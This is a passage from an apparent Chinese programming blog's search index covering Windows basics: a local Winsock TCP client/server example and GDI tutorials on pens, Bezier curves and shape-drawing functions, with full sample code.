::WSAGetLastError(); //关闭库 closesocket(socketListen); WSACleanup(); return -1; &#125; //开始监听 if (SOCKET_ERROR == listen(socketListen,2)) &#123; printf(\"listen fail!\"); //关闭库 closesocket(socketListen); WSACleanup(); return -1; &#125; //接受链接 SOCKADDR_IN sockClient; int nLen = sizeof(sockClient); SOCKET newSocket; newSocket = accept(socketListen, NULL, NULL); //getsockname(socketListen, (struct sockaddr*)&amp;sockClient, &amp;nLen); if (INVALID_SOCKET == newSocket) &#123; printf(\"listen fail!\" ); //关闭库 closesocket(socketListen); WSACleanup(); return -1; &#125; while(g_nFlag) &#123; //判断客户端连接的集合中是否有需要接收的数据 char szRecvBuffer[5] = &#123;0&#125;; char szSendBuffer[1024]; //遍历setClient集合，如果发现setClient中的某个 int nReturnValue = recv(newSocket, szRecvBuffer, sizeof(szRecvBuffer)-1, 0); int nRes = WSAGetLastError(); if (0 == nReturnValue) &#123; //客户端正常关闭 服务端释放Socket continue ; &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //网络中断 printf(\"客户端中断连接\"); continue; &#125; else &#123; //接收到客户端消息 printf(\"Client Data : %s \\n\",szRecvBuffer); //给客户回信 //scanf_s (\"%s\", szSendBuffer, 1024); //getchar(); //send(newSocket, \"repeat over\", strlen(szSendBuffer)+1, 0); &#125; &#125; //关闭socket closesocket(socketListen); closesocket(newSocket); //关闭网络库 WSACleanup(); //system(\"pause\"); return 0;&#125; 创建客户端步骤 打开网络头文件 启动网络库 校验版本 创建SOCKET 链接到服务器 与服务端收发消息 链接到服务器 链接服务器并把服务器信息与服务器socket绑定到一起 123456int WSAAPI connect( SOCKET s, //服务器socket const sockaddr *name, //服务器Ip地址端口号结构体 int namelen //参数2结构体大小); 返回值 成功 ​ 返回0 失败 ​ 返回 SOCKET_ERROR ​ WSAGetLastError()得到错误码 ​ 释放空间 ​ closesocket(socketListen); ​ WSACleanup(); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Winsock2.h&gt;#pragma comment(lib, \"Ws2_32.lib\")int main(void)&#123; WORD wdVersion = MAKEWORD(2, 2); WSADATA wdScokMsg; int nRes = WSAStartup(wdVersion, &amp;wdScokMsg); if (0 != nRes) &#123; switch (nRes) &#123; case WSASYSNOTREADY: printf(\"重启下电脑试试，或者检查网络库\"); break; case WSAVERNOTSUPPORTED: printf(\"请更新网络库\"); break; case WSAEINPROGRESS: printf(\"请重新启动\"); break; case WSAEPROCLIM: printf(\"请尝试关掉不必要的软件，以为当前网络运行提供充足资源\"); break; &#125; return 0; &#125; //校验版本 if (2 != HIBYTE(wdScokMsg.wVersion) || 2 != LOBYTE(wdScokMsg.wVersion)) &#123; //说明版本不对 //清理网络库 WSACleanup(); return 0; &#125; //服务器socket SOCKET socketServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == socketServer) &#123; int a = WSAGetLastError(); //清理网络库 WSACleanup(); return 0; &#125; //链接服务器 struct sockaddr_in serverMsg; serverMsg.sin_family = AF_INET; serverMsg.sin_port = htons(12345); serverMsg.sin_addr.S_un.S_addr = inet_addr(\"127.0.0.1\"); if (SOCKET_ERROR == connect(socketServer, (struct sockaddr*)&amp;serverMsg, sizeof(serverMsg))) &#123; int a = WSAGetLastError(); closesocket(socketServer); //清理网络库 WSACleanup(); return 0; &#125; while (1) &#123; char buf[1500] = &#123; 0 &#125;; //int res = recv(socketServer, buf, 50, 0); //if (0 == res) //&#123; // printf(\"链接中断、客户端下线\\n\"); //&#125; //else if (SOCKET_ERROR == res) //&#123; // //出错了 // int a = WSAGetLastError(); // //根据实际情况处理 //&#125; //else //&#123; // printf(\"%d %s\\n\", res, buf); //&#125; scanf(\"%s\", buf); if ('0' == buf[0]) &#123; break; &#125; if (SOCKET_ERROR == send(socketServer, buf, strlen(buf), 0)) &#123; //出错了 int a = WSAGetLastError(); //根据实际情况处理 printf(\"%d\\n\", a); &#125; &#125; //清理网络库 closesocket(socketServer); WSACleanup(); system(\"pause\"); return 0;&#125;","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"画笔","slug":"pwcp015-画笔","date":"2021-06-08T04:52:49.000Z","updated":"2021-06-08T08:07:32.586Z","comments":true,"path":"2021/06/08/pwcp015-画笔/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/08/pwcp015-画笔/","excerpt":"","text":"画笔 HPEN创建画笔句柄变量 1HPEN hPen1; CreatePen创建画笔 1HPEN CreatePen(int nPenStyle, int nWidth, COLORREF crColor); nPenStyle ------ Long，指定画笔样式，可以是下述常数之一 PS_SOLID 画笔画出的是实线 PS_DASH 画笔画出的是虚线（nWidth必须不大于1） PS_DOT 画笔画出的是点线（nWidth必须不大于1） PS_DASHDOT 画笔画出的是点划线（nWidth必须不大于1） PS_DASHDOTDOT 画笔画出的是点-点-划线（nWidth必须不大于1） PS_NULL 画笔不能画图 PS_INSIDEFRAME 由椭圆、矩形、圆角矩形、饼图以及弦等生成的封闭对象框时，画线宽度向内扩展。如指定的准确RGB颜色不存在，就进行抖动处理 nWidth --------- Long，以逻辑单位表示的画笔的宽度 crColor -------- Long，画笔的RGB颜色 [返回值] Long，如函数执行成功，就返回指向新画笔的一个句柄；否则返回零 [其它] 一旦不再需要画笔，记得用DeleteObject函数将其删除 SelectObject 该函数选择一对象到指定的设备上下文环境中，该新对象替换先前的相同类型的对象。 1HGDIOBJ SelectObject(HDC hdc, HGDIOBJ hgdiobj) 参数： hdc：设备上下文环境的句柄。 hgdiobj：被选择的对象的句柄，该指定对象必须由如下的函数创建。 位图：CreateBitmap, CreateBitmapIndirect, CreateCompatible Bitmap, CreateDIBitmap, CreateDIBsection（只有内存设备上下文环境可选择位图，并且在同一时刻只能一个设备上下文环境选择位图）。 画刷：CreateBrushIndirect, CreateDIBPatternBrush, CreateDIBPatternBrushPt, CreateHatchBrush, CreatePatternBrush, CreateSolidBrush。 字体：CreateFont, CreateFontIndirect。 笔：CreatePen, CreatePenIndirect。 区域：CombineRgn, CreateEllipticRgn, CreateEllipticRgnIndirect, CreatePolygonRgn, CreateRectRgn, CreateRectRgnIndirect。 返回值：如果选择对象不是区域并且函数执行成功，那么返回值是被取代的对象的句柄；如果选择对象是区域并且函数执行成功，返回如下一值: SIMPLEREGION：区域由单个矩形组成； COMPLEXREGION：区域由多个矩形组成; NULLREGION：区域为空。 如果发生错误并且选择对象不是一个区域，那么返回值为NULL，否则返回HGDI_ERROR。 注释：该函数返回先前指定类型的选择对象，一个应用程序在它使用新对象进行绘制完成之后，应该用原始的缺省的对象替换新对象。 应用程序不能同时选择一个位图到多个设备上下文环境中。 ICM：如果被选择的对象是画笔或笔，那么就执行颜色管理。 GetStockObject 该函数检索预定义的备用笔、刷子、字体或者调色板的句柄。 1HGDIOBJ GetStockObject(int fnObject)； fnObject：指定对象的类型，该参数可取如下值之一； BLACK_BRUSH：黑色画刷；DKGRAY_BRUSH：暗灰色画刷； DC_BRUSH：在Windows98,Windows NT 5.0和以后版本中为纯颜色画刷，缺省色为白色，可以用SetDCBrushColor函数改变颜色，更多的信息参见以下的注释部分。 GRAY_BRUSH：灰色画刷笔； HOLLOW_BRUSH：空画刷（相当于NULL_BRUSH）； NULL_BRUSH：空画刷（相当于HOLLOW_BRUSH）； LTGRAY_BRUSH：亮灰色画刷； WHITE_BRUSH：白色画刷； BLACK_PEN：黑色钢笔； DC_PEN：在Windows98、Windows NT 5.0和以后版本中为纯色钢笔，缺省色为白色，使用SetDCPenColor函数可以改变色彩，更多的信息，参见下面的注释部分。 WHITE_PEN：白色钢笔； ANSI_FIXED_FONT：在Windows中为固定间距（等宽）系统字体； ANSI_VAR_FONT：在Windows中为变间距（比例间距）系统字体； DEVICE_DEFAUCT_FONT：在WindowsNT中为设备相关字体； DEFAULT_GUI_FONT：用户界面对象缺省字体，如菜单和对话框； OEM_FIXED_FONT：原始设备制造商（OEM）相关固定间距（等宽）字体； SYSTEM_FONT：系统字体，在缺省情况下，系统使用系统字体绘制菜单，对话框控制和文本； SYSTEM_FIXED_FONT：固定间距（等宽）系统字体，该对象仅提供给兼容16位Windows版本； DEFAULT_PALETTE：缺省调色板，该调色板由系统调色板中的静态色彩组成。 返回值 如果成功，返回值标识申请的逻辑对象，如果失败，返回值为NULL。 注释 仅在CS_HREDRAW和CS_VREDRAW风格的窗口中使用DKGRAY_BRUSH、GRAY_BRUSH和LTGRAY_BRUSH对象。 如果在其他风格的窗口中使灰色画笔，可能导致在窗口移动或改变大小之后出现画笔模式错位现象，原始储存画笔不能被调整。 HOLLOW_BRUSH和NULL_BRUSH储存对象相等。 由DEFAULT_GUI_FONT储存对象使用的字体将改变。当想使用菜单、对话框和其他用户界面对象使用的字体时请使用此储存对象。 不必要通过调用DeleteObject函数来删除储存对象。 1GetStockObject(BLACK_PEN); DeleteObject删除对象句柄 1BOOL DeleteObject(HGDIOBJ hObject)； hObject：逻辑笔、画笔、字体、位图、区域或者调色板的句柄。 返回值：成功，返回非零值；如果指定的句柄无效或者它已被选入设备上下文环境，则返回值为零。 注释：当一个绘画对象（如笔或画笔）当前被选入一个设备上下文环境时不要删除该对象。当一个调色板画笔被删除时，与该画笔相关的位图并不被删除，该图必须单独地删除。 系统备用的画笔不可以DeleteObject 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228// 画笔.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画笔.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; //创建画笔句柄变量 static HPEN hPen1, hPen2, hPen3,hOldPen; static int cxClient, cyClient; static int cyLine; switch (message) &#123; case WM_SIZE: cxClient = LOWORD(lParam); cyClient = HIWORD(lParam); cyLine = cyClient / 8; //创建画笔句柄,除了PS_SOLID可以设置宽度,其他的都不可以设置宽度 CreatePen(, 宽度 ,) hPen1 = CreatePen(PS_SOLID,1,RGB(0,0,0)); hPen2 = CreatePen(PS_DASH, 1, RGB(255, 0, 0)); hPen3 = CreatePen(PS_DOT, 1, RGB(0, 255, 0)); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //SelectObject 设置画笔 hOldPen = (HPEN)SelectObject(hdc, hPen1); //设置起点位置 MoveToEx(hdc,0,cyLine * 1,NULL); //从起点画到终点 LineTo(hdc,cxClient, cyLine * 1); SelectObject(hdc, hPen2); MoveToEx(hdc, 0, cyLine * 2, NULL); LineTo(hdc, cxClient, cyLine * 2); SelectObject(hdc, hPen3); MoveToEx(hdc, 0, cyLine * 3, NULL); LineTo(hdc, cxClient, cyLine * 3); SelectObject(hdc, CreatePen(PS_DASHDOT,1,RGB(20,25,255))); MoveToEx(hdc, 0, cyLine * 4, NULL); LineTo(hdc, cxClient, cyLine * 4); //DeleteObject删除旧画笔句柄 DeleteObject(SelectObject(hdc, CreatePen(PS_DASHDOTDOT, 1, RGB(20, 25, 255)))); MoveToEx(hdc, 0, cyLine * 5, NULL); LineTo(hdc, cxClient, cyLine * 5); //系统备用的画笔不可以DeleteObject //GetStockObject获取系统备用对象,获取备用画笔句柄 DeleteObject(SelectObject(hdc,GetStockObject(BLACK_PEN) )); MoveToEx(hdc, 0, cyLine * 6, NULL); LineTo(hdc, cxClient, cyLine * 6); SelectObject(hdc,hOldPen); DeleteObject(hPen1); DeleteObject(hPen2); DeleteObject(hPen3); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"贝塞尔曲线","slug":"pwcp014-贝塞尔曲线","date":"2021-06-07T13:26:23.000Z","updated":"2022-05-30T16:03:27.018Z","comments":true,"path":"2021/06/07/pwcp014-贝塞尔曲线/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp014-贝塞尔曲线/","excerpt":"","text":"贝塞尔曲线 PolyBezier 1BOOL PolyBezier(HDC hdc, CONST POINT *lppt, DWORD cPoints); ● 参数 hdc：指定的设备环境句柄。 lppt：POINT结构数组的指针，包括了样条端点和控制点的坐标，其顺序是起点的坐标、起点的控制点的坐标、终点的控制点的坐标和终点的坐标。 cPoints：指明数组中的点的个数。 ● 返回值 若函数调用成功，则返回非零，否则返回零。 PolyBezierTo 12345BOOL PolyBezierTo(HDChdc,CONST POINT*lppt,DWORD cCount); hdc ------------ Long，要在其中绘图的设备场景 lppt ----------- POINTAPI，指定一个POINTAPI结构数组。其中的第一个结构指定了起点。剩下的点三个一组——包括两个控件点和一个终点. cCount---------- lppt数组的总点数 12345678//按下鼠标右键消息WM_RBUTTONDOWN://按下鼠标左键消息WM_LBUTTONDOWN://移动鼠标消息WM_MOUSEMOVE:wParam参数是按下了哪个键 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258// 贝塞尔曲线.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"贝塞尔曲线.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////void DrawBezier(HDC hdc,POINT apt[]) &#123; PolyBezier(hdc,apt,4); MoveToEx(hdc,apt[0].x, apt[0].y,NULL); LineTo(hdc, apt[1].x, apt[1].y); MoveToEx(hdc, apt[3].x, apt[3].y, NULL); LineTo(hdc, apt[2].x, apt[2].y);&#125;void DrawBezier2(HDC hdc, POINT apt[]) &#123; MoveToEx(hdc, apt[0].x, apt[0].y, NULL); PolyBezierTo(hdc, apt + 1, 3); MoveToEx(hdc, apt[0].x, apt[0].y, NULL); LineTo(hdc, apt[1].x, apt[1].y); MoveToEx(hdc, apt[3].x, apt[3].y, NULL); LineTo(hdc, apt[2].x, apt[2].y);&#125;LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static POINT apt[4]; HDC hdc; switch (message) &#123; case WM_RBUTTONDOWN: case WM_LBUTTONDOWN: case WM_MOUSEMOVE: if (wParam &amp; MK_RBUTTON || wParam &amp; MK_LBUTTON ) &#123; hdc = GetDC(hWnd); //用白色画笔还原 SelectObject(hdc,GetStockObject(WHITE_PEN)); DrawBezier(hdc, apt); //如果按下鼠标左键 if (wParam &amp; MK_LBUTTON) &#123; apt[1].x = LOWORD(lParam); apt[1].y = HIWORD(lParam); &#125; //如果按下鼠标右键 if (wParam &amp; MK_RBUTTON) &#123; apt[2].x = LOWORD(lParam); apt[2].y = HIWORD(lParam); &#125; //用黑色画笔画 SelectObject(hdc, GetStockObject(BLACK_PEN)); DrawBezier(hdc, apt); //DrawBezier2(hdc, apt); ReleaseDC(hWnd,hdc); &#125; break; case WM_SIZE: //设置起点,起点控点,终点控点,终点 apt[0].x = LOWORD(lParam) / 5; apt[0].y = HIWORD(lParam)/2; apt[1].x = 0; apt[1].y = 0; apt[2].x = LOWORD(lParam) * 4 / 5; apt[2].y = HIWORD(lParam)/2 - 200; apt[3].x = LOWORD(lParam) * 4/ 5; apt[3].y = HIWORD(lParam)/2; break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... DrawBezier(hdc,apt); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"边框绘制函数","slug":"pwcp013-边框绘制函数","date":"2021-06-07T12:08:10.000Z","updated":"2021-06-07T13:06:27.013Z","comments":true,"path":"2021/06/07/pwcp013-边框绘制函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp013-边框绘制函数/","excerpt":"","text":"边框绘制函数 Rectangle矩形 使用该函数画一个矩形，可以用当前的画笔画矩形轮廓，用当前画刷进行填充。 1BOOL Rectangle(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect)； hdc：设备环境句柄。 nLeftRect：指定矩形左上角的逻辑X坐标。 nTopRect：指定矩形左上角的逻辑Y坐标。 nRightRect：指定矩形右下角的逻辑X坐标。 nBottomRect：指定矩形右下角的逻辑Y坐标。 返回值：如果函数调用成功，返回值非零，否则返回值为0。 Windows NT：若想获得更多错误信息，请调用GetLastError函数。 备注：此函数不使用和改变当前位置。 1Rectangle(hdc,200,50,600,400); Ellipse画圆或椭圆 123456BOOL Ellipse(HDC hdc,int nLeftRect,int nTopRect,int nRightRect,int nBottomRect)； hdc：设备环境句柄。 nLeftRect：指定限定矩形左上角的X坐标。 nTopRect：指定限定矩形左上角的Y坐标。 nRightRect：指定限定矩形右下角的X坐标。 nBottomRect：指定限定矩形右下角的Y坐标。 如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 Windows NT：若想获得更多错误信息，请调用GetLastError函数。 1Ellipse(hdc, 200, 50, 600, 400); RoundRect带圆角的矩形 该函数画一个带圆角的矩形，此矩形由当前画笔画轮廓，由当前画刷填充。 1BOOL RoundRect(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidth, int nHeight)； 参数： hdc：设备环境句柄。 nLeftRect：指定矩形左上角的X坐标。 nTopRect：指定矩形左上角的Y坐标。 nRightRect：指定矩形右下角的X坐标。 nbottomRect：指定矩形右下角的Y坐标。 nWidth：指定用来画圆角的椭圆的宽。 nHeight：指定用来画圆角的椭圆的高。 返回值：如果函数调用成功，则返回值非空，否则返回值是0。 Windows NT：若想获得更多的错误信息，请调用GetLastError函数。 1RoundRect(hdc, 700, 50, 1100, 400,100,100); ARC画圆弧 12345678910BOOL Arc(HDC hdc,int xLeft,int yTop,int xRight,int yBottom,int XStart,int YStart,int XEnd,int YEnd); hdc 绘画的窗口句柄 xLeft和nyTopt指定外接矩形左上角坐标 xRight和yBottom指定外接矩形右下角坐标 xStart和yStart指定圆弧开始坐标 xEnd和nyEnd指定圆弧结束坐标 1Arc(hdc, 850, 500, 1000, 650, 20, 600, 1200, 400); Chord画弦 1234BOOL Chord( DC: HDC; &#123;设备环境句柄&#125; int X1, Y1, X2, Y2, X3, Y3, X4, Y4 ; &#123;四个坐标点&#125;); 参数表 X1,Y1 ---------- Long，指定围绕椭圆的一个矩形的左上角位置 X2,Y2 ---------- Long，指定围绕椭圆的一个矩形的右下角位置 X3,Y3 ---------- Long，指定与椭圆相交的一条线的一个点 X4,Y4 ---------- Long，指定与椭圆相交的一条线的另一个点 返回值 Long，非零表示成功，零表示失败。会设置GetLastError 1Chord(hdc, 450,500,800,850, 20, 600, 1200, 400); Pie画圆饼 1BOOL Pie(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2)； hdc：设备环境句柄。 nLeftRect：指定限定矩形左上角的X坐标。 nTopRect：指定限定矩形左上角的Y坐标。 nRigthRect：指定限定矩形右下角的X坐标。 nBottomRect：指定限定矩形右下角的Y坐标。 nXRadial1：指定第一条半径的端点的X坐标。 nYRadial1：指定第一条半径的端点的Y坐标。 nXRadial2：指定第二条半径的端点的X坐标。 nYRadial2：指定第二条半径的端点的Y坐标。 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 Windows：要得到更多的错误信息，调用GetLastError。 1Pie(hdc,50,500,400,850,500,0,50,650); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193// 边框绘制函数.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"边框绘制函数.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, 